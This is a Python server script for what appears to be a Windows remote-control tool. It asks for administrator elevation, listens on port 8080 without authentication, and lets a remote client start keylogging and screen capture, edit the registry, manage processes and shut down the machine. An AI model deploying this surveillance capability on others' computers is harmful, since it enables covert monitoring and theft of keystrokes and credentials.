from ServerSocket import ServerSocket
from KeyLogger import KeyLogger
from Window import OS
from Registry import Registry
from Screen import Screen
from Process import Process
from Application import Application
from Network import Network
from SysTrayIcon import SysTrayIcon
from ctypes import windll

import itertools, glob
import sys
import socket
import os

HOST = ""
PORT = 8080
ADDR = (HOST, PORT)


class ServerApp:
    def __init__(self):
        if self.is_admin():
            self.setup()

        else:
            windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )

    def is_admin(self):
        try:
            return windll.shell32.IsUserAnAdmin()
        except:
            return False

    def setup(self):
        icons = itertools.cycle(
            glob.glob(os.path.dirname(os.path.realpath(__file__)) + "/*.ico")
        )
        SysTrayIcon(
            next(icons),
            "Waiting for connection...",
            (),
            on_start=self.open_server,
            on_quit=self.quit,
            default_menu_index=1,
        )

    def open_server(self, sysTrayIcon):
        self.server = ServerSocket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind(ADDR)
        self.server.listen(1)

        self.key_logger = KeyLogger(self.server)
        self.os = OS()
        self.registry = Registry(self.server)
        self.screen = Screen(self.server)
        self.process = Process(self.server)
        self.application = Application(self.server)
        self.network = Network(self.server)

        self.start_listening(sysTrayIcon)

    def start_listening(self, sysTrayIcon):
        try:
            addr = self.server.accept()
            sysTrayIcon.hover_text = "Connected by " + addr[0]
            sysTrayIcon.refresh_icon()

            dict = {
                "KEYLOG": self.key_logger.start_listening,  # DONE
                "SHUTDOWN": self.os.shutdown,  # DONE
                "LOGOUT": self.os.logout,  # DONE
                "REGISTRY": self.registry.start_listening,  # DONE
                "TAKEPIC": self.screen.start_recording,  # DONE
                "PROCESS": self.process.start_listening,  # DONE
                "APPLICATION": self.application.start_listening,  # DONE
                "MAC_ADDRESS": self.network.mac_address,  # DONE
            }

            while True:
                print("MENU:")
                s = self.server.receive_signal()

                if s in dict:
                    dict[s]()
                elif s == "QUIT":
                    break

            sysTrayIcon.hover_text = "Waiting for connection..."
            sysTrayIcon.refresh_icon()
            self.key_logger.stop()
            self.start_listening(sysTrayIcon)

        except:
            self.quit(sysTrayIcon)

    def quit(self, SysTrayIcon):
        try:
            self.key_logger.stop()
            self.server.close()
        except:
            pass


if __name__ == "__main__":
    ServerApp()
